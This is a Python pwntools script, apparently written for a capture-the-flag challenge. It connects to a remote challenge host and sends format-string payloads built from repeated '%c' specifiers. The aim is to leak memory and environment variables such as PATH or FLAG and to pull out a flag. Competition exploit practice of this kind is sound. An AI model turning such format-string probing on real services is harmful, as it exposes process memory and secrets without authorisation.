#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Maybe the flag is in an environment variable set by the challenge infrastructure
# Let me try to reach higher in memory by maximizing our %c count

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked: {leak}")

r.recvuntil(b"Write your path:")

# Try exactly at the boundary - maybe 120-125 range
for attempt in [120, 121, 122, 123, 124, 125]:
    r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)
    r.recvuntil(b"Write your path:")
    
    payload = b"[" + b"%c" * attempt + b"]"
    r.sendline(payload)
    
    data = r.recvall(timeout=2)
    
    if b"0xL4ugh{" in data:
        idx = data.find(b"0xL4ugh{")
        end = data.find(b"}", idx)
        if end > idx:
            flag = data[idx:end+1]
            log.success(f"\n\n*** FLAG: {flag.decode()} ***\n\n")
            break
        else:
            log.info(f"Partial flag at {attempt}: {data[idx:idx+40]}")
    
    if b"malformed" not in data and len(data) > 100:
        log.info(f"Attempt {attempt}: Got {len(data)} bytes, checking for env data...")
        # Look for PATH= or other env markers
        if b"PATH=" in data or b"HOME=" in data or b"FLAG=" in data:
            log.success(f"Found environment variable marker!")
            print(hexdump(data))
            break
    
    r.close()

